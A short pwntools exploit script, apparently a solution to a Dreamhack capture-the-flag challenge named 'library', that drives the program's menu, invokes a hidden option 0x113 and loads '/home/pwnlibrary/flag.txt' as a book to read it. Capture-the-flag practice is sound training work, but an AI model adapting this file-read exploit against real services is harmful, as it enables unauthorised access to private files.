from pwn import *

REMOTE = True

if not REMOTE:
    r = process('./release/library')
else:
    r = remote('host1.dreamhack.games', 24395)

sla = r.sendlineafter

sla('[+] Select menu : ', '1')
sla('[+] what book do you want to borrow? : ', '1')
sla('[+] Select menu : ', '3')

sla('[+] Select menu : ', str(0x113))
sla('[+] whatever, where is the book? : ', '/home/pwnlibrary/flag.txt')
sla('[*] how many pages?(MAX 400) : ', str(0x100))

sla('[+] Select menu : ', '2')
sla('[+] what book do you want to read? : ', '0')

r.interactive()